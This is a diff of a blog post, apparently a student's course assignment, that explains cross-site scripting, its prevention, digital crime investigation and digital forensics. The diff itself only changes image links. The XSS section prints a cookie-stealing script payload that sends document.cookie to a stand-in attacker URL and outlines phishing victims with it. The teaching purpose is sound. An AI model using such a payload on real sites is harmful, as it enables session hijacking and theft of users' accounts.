@@ -3,11 +3,11 @@ layout: post
 title: My Opinion of XSS/CSS, Digital Forensic, and Digital Crime Investigation when I was a Young Student
 categories: masters
 tags: [technology, computers, XSSCSS, digital forensic, assignment]
-featuredimage: https://images.blurt.buzz/DQmbds3FcyD2UnctK7GepM8BFibTnGwd1vJjVAmvXHm3KHC/0.featured-image.png
+featuredimage: https://steemitimages.com/640x0/https://images.blurt.buzz/DQmbds3FcyD2UnctK7GepM8BFibTnGwd1vJjVAmvXHm3KHC/0.featured-image.png
 description: My Opinion of XSS/CSS, Digital Forensic, and Digital Crime Investigation when I was a Young Student
 canonicalurl: https://0fajarpurnama0.github.io/masters/2020/07/20/opinion-xsscss-digital-forensic-crime-investigation
 ---
-![0.featured-image.png](https://images.blurt.buzz/DQmbds3FcyD2UnctK7GepM8BFibTnGwd1vJjVAmvXHm3KHC/0.featured-image.png)
+![0.featured-image.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmbds3FcyD2UnctK7GepM8BFibTnGwd1vJjVAmvXHm3KHC/0.featured-image.png)
 
 
 ## Note
@@ -18,7 +18,7 @@ This is the fourteenth assignment from my Masters Advanced Network Security Cour
 
 XSS/CSS stands for cross site scripting which is a computer security vulnerability to inject scripts into web pages viewed by other users [1]. What is the difference between code injection? Code injection is a server side vulnerability while XSS is a client side vulnerability, what they have in common is they are injection type attack [2]. One of the easiest method to check for XSS vulnerability is to include a html tags into the submission form, for example on Figure 1 is an ```<S>``` (strike-through) html tag inserted on a simple php form input (any php tutorial on the web have this tutorial) and Figure 2 is an example of using ```<img src=””>``` tag to add an image, even worse we can input tags that could display the attacker site instead and take the victim site with ```<script>```document.location="http://some_attacker/cookie.cgi?" + document.cookie```</script>```. (1) Once a XSS vulnerability had been found we can send a phising email to the user of the site containing the XSS script. (2) With a good social engineering the user site can be tricked in running the code and connect to attacker's site through the vulnerable XSS site. (3) The attacker can obtain the session ID and other informations of the victim. [3]
 
-![1.strikethroughXSSexample.png](https://images.blurt.buzz/DQmYm6X16ideByV9t7ZAJnXb5ypBVHbq3khnuhkvkkB4AYz/1.strikethroughXSSexample.png)
+![1.strikethroughXSSexample.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmYm6X16ideByV9t7ZAJnXb5ypBVHbq3khnuhkvkkB4AYz/1.strikethroughXSSexample.png)
 
 Figure 1\. Checking XSS vulnerability strike through HTML tag example.
 
@@ -26,7 +26,7 @@ Figure 1\. Checking XSS vulnerability strike through HTML tag example.
 
 To prevent XSS we have to filter the user input. One way is to not allow html tags for, or perform sensitization allowing text formatting tag such as ```<B>``` ```<U>``` ```<I>``` ```<S>```, and converting dangerous tags like “&→&amp”, “&lt→&lt”, “&gt→&gt”, “”→&quot”, “'→&x27”, and “/→&x2f”. For my above PHP code I can fix it by changing the output function (adding) into “echo htmlspecialchars($string, ENT_QUOTES, 'UTF-8')”. There are libraries available for filtering XSS if it's difficult to make our own libraries such as “PHP AntiXSS”, “xss_clean.php filter”, “htmlpurifier”, “xssprotect”, and “XSS html filter”. [4]
 
-![2.imgsrcXSS.png](https://images.blurt.buzz/DQmYqWwbtpStpvT7u52VrGNSTGKKnaGh5c9tuZtAAmAhGyE/2.imgsrcXSS.png)
+![2.imgsrcXSS.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmYqWwbtpStpvT7u52VrGNSTGKKnaGh5c9tuZtAAmAhGyE/2.imgsrcXSS.png)
 
 Figure 2\. Checking XSS vulnerability image HTML tag example.
 
@@ -36,7 +36,7 @@ Figure 2\. Checking XSS vulnerability image HTML tag example.
 
 Digital crime investigation is mainly used in criminal investigation in order to enhance the criminal investigation process itself. It's more like an auxiliary to tool in which is specifically digital typed tools. For example (1) the use of surveillance camera to capture robbery incident in stores, (2) categorizing data, clustering data, plotting graph, which is under data mining, (3) using database to store crime records. On the other hand digital forensic is to extract, collect, analyze, and preserve digital evidence, for example to be shown in court. [5]
 
-![3.digital-forensic-on-hardware.png](https://images.blurt.buzz/DQmautrcqEVMghJ5C6GvKa4N5CRGqAoG187s1oh7zcFSMWi/3.digital-forensic-on-hardware.png)
+![3.digital-forensic-on-hardware.png](https://steemitimages.com/640x0/https://images.blurt.buzz/DQmautrcqEVMghJ5C6GvKa4N5CRGqAoG187s1oh7zcFSMWi/3.digital-forensic-on-hardware.png)
 
 Figure 3\. Illustration of digital forensic on hardware containing data.
 
